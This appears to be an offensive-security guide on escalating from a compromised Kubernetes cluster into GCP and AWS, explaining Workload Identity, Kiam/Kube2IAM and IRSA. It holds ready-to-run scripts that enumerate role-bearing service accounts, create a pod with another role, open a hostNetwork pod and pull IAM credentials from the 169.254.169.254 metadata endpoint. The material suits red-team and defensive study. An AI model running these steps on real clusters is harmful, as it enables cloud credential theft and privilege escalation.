# GCP

If you are running a k8s cluster inside GCP you will probably want that some application running inside the cluster has some access to GCP. There are 2 common ways of doing that:

## Mounting GCP-SA keys as secret

A common way to give **access to a kubernetes application to GCP** is to:

* Create a GCP Service Account
* Bind on it the desired permissions
* Download a json key of the created SA
* Mount it as a secret inside the pod
* Set the GOOGLE\_APPLICATION\_CREDENTIALS environment variable pointing to the path where the json is.

{% hint style="warning" %}
Therefore, as an **attacker**, if you compromise a container inside a pod, you should check for that **env** **variable** and **json** **files** with GCP credentials.
{% endhint %}

## GKE Workload Identity

With Workload Identity, we can configure a[ Kubernetes service account](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) to act as a[ Google service account](https://cloud.google.com/iam/docs/understanding-service-accounts). Pods running with the Kubernetes service account will automatically authenticate as the Google service account when accessing Google Cloud APIs.

The **first series of steps** to enable this behaviour is to **enable Workload Identity in GCP** ([**steps**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) and create the GCP SA you want k8s to impersonate.

The **second steps** is to relate a K8s SA (KSA) with the GCP SA (GSA):

* Create the KSA (normally in the **annotations appear the email of the GSA**) and use it in the pod you would like to:

```yaml
# serviceAccount.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
    annotations:    
        iam.gke.io/gcp-service-account: $GSA-NAME@PROJECT-ID.iam.gserviceaccount.com
    name: $APPNAME
    namespace: $NAMESPACE
```

* Create the KSA - GSA Binding:

```bash
gcloud iam service-accounts   \
  --role roles/iam.workloadIdentityUser \
  --member "serviceAccount:PROJECT-ID.svc.id.goog[$NAMESPACE/$KSA-NAME]" \
  $GSA-NAME@PROJECT-ID.iam.gserviceaccount.com
```

Note how you are creating a binding and in the **member field you can find the namespace and KSA name**.

{% hint style="warning" %}
As an attacker inside K8s you should **search for SAs** with the **`iam.gke.io/gcp-service-account` annotation** as that indicates that the SA can access something in GCP. Another option would be to try to abuse each KSA in the cluster and check if it has access.\
From GCP is always interesting to enumerate the bindings and know **which access are you giving to SAs inside Kubernetes**.
{% endhint %}

This is a script to easily **iterate over the all the pods** definitions **looking** for that **annotation**:

```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
    for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "Pod: $ns/$pod"
        kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
        echo ""
        echo ""
    done
done | grep -B 1 "gcp-service-account"
```

# AWS

## Kiam & Kube2IAM (IAM role for Pods)  <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

An (outdated) way to give IAM Roles to Pods is to use a [**Kiam**](https://github.com/uswitch/kiam) or a [**Kube2IAM**](https://github.com/jtblin/kube2iam) **server.** Basically you will need to run a **daemonset** in your cluster with a **kind of privileged IAM role**. This daemonset will be the one that will give access to IAM roles to the pods that need it.

First of all you need to configure **which roles can be accessed inside the namespace**, and you do that with an annotation inside the namespace object:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
  name: iam-example
  annotations:
    iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
  annotations:
    iam.amazonaws.com/allowed-roles: |
      ["role-arn"]
  name: default
```
{% endcode %}

Once the namespace is configured with the IAM roles the Pods can have you can **indicate the role you want on each pod definition with something like**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
  name: foo
  namespace: external-id-example
  annotations:
    iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
As an attacker, if you **find these annotations** in pods or namespaces or a kiam/kube2iam server running (in kube-system probably) you can **impersonate every r**ole that is already **used by pods** and more (if you have access to AWS account enumerate the roles).
{% endhint %}

### Create Pod with IAM Role

{% hint style="info" %}
The IAM role to indicate must be in the same AWS account as the kiam/kube2iam role and that role must be able to access it.
{% endhint %}

```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
  annotations:
    iam.amazonaws.com/role: transaction-metadata
  name: alpine
  namespace: eevee
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]' | kubectl apply -f -
```

## Workflow of IAM role for Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

This is the recommended way by AWS.

1. First of all you need to [create an OIDC provider for the cluster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Then you create an IAM role with the permissions the SA will require.
3. Create a [trust relationship between the IAM role and the SA](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts-technical-overview.html) name (or the namespaces giving access to the role to all the SAs of the namespace). _The trust relationship will mainly check the OIDC provider name, the namespace name and the SA name_.
4. Finally, **create a SA with an annotation indicating the ARN of the role**, and the pods running with that SA will have **access to the token of the role**. The **token** is **written** inside a file and the path is specified in **`AWS_WEB_IDENTITY_TOKEN_FILE`** (default: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)

(You can find an example of this configuration [here](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/))

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  annotations:
    eks.amazonaws.com/role-arn: arn:aws-cn:iam::ACCOUNT_ID:role/IAM_ROLE_NAME
```

{% hint style="warning" %}
As an attacker, if you can enumerate a K8s cluster, check for **service accounts with that annotation** to **escalate to AWS**. To do so, just **exec/create** a **pod** using one of the IAM **privileged service accounts** and steal the token.

Moreover, if you are inside a pod, check for env variables like **AWS\_ROLE\_ARN** and **AWS\_WEB\_IDENTITY\_TOKEN.**


{% endhint %}

## Find Pods a SAs with IAM Roles in the Cluster

This is a script to easily **iterate over the all the pods and sas** definitions **looking** for that **annotation**:

```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
    for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "Pod: $ns/$pod"
        kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
    for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "SA: $ns/$sa"
        kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
done | grep -B 1 "amazonaws.com"
```

## Node IAM Role

The previos section was about how to steal IAM Roles with pods, but note that a **Node of the** K8s cluster is going to be an **instance inside the cloud**. This means that the Node is highly probable going to **have a new IAM role you can steal** (_note that usually all the nodes of a K8s cluster will have the same IAM role, so it might not be worth it to try to check on each node_).

There is however an important requirement to access the metadata endpoint from the node, you need to be in the node (ssh session?) or at least have the same network:

```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```

## Steal IAM Role Token

Previously we have discussed how to **attach IAM Roles to Pods** or even how to **escape to the Node to steal the IAM Role** the instance has attached to it.

You can use the following script to **steal** your new hard worked **IAM role credentials**:

```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
    echo "IAM Role discovered: $IAM_ROLE_NAME"
    if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
        echo "Credentials:"
        curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
    fi
fi
```
